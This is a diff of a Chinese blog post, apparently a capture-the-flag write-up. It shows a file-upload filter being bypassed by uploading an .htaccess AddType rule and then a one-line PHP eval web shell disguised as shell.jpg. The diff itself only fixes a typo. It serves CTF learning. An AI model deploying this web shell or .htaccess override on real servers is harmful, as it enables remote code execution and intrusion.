@@ -177,7 +177,7 @@ SetHandler application/x-httpd-php
 <pre><code>AddType application/x-httpd-php .jpg
 // 1.jpg
 &lt;?php eval($_GET[&#39;a&#39;]);?&gt;  </code></pre>
-<p>这里我们采用方法而就行了，打开.htaccess文件并且写入AddType application/x-httpd-php shell.jpg在上传就行了。注意要把type改成image/jpeg类型。<br><img src="https://i.loli.net/2021/02/25/3qM5SCWOIk4NuhJ.png" alt="10.png">  </p>
+<p>这里我们采用方法二就行了，打开.htaccess文件并且写入AddType application/x-httpd-php shell.jpg在上传就行了。注意要把type改成image/jpeg类型。<br><img src="https://i.loli.net/2021/02/25/3qM5SCWOIk4NuhJ.png" alt="10.png">  </p>
 <p>可以看到，.htaccess文件已经成功上传了，接下来再上传我们的图片后缀的一句话代码就可以用剑蚁连接了。上传路径是upload/bba643cb99ca81e160bd4430543786f9/shell.jpg<br>在根目录下就可以找到flag。  </p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题和之前那道题目很类似，都使在无法绕过后缀名的限制的情况下通过修改配置文件来使我们上传的jpg文件也能被解析成php文件从而执行一句话木马。原理差不多相同。关于上传问题还是有很多类型的，需要多多积累。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/since_2020/article/details/113781120?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161418501016780262570602%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161418501016780262570602&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-113781120.first_rank_v2_pc_rank_v29&utm_term=.htaccess%E6%96%87%E4%BB%B6">.htaccess文件</a></p>
 
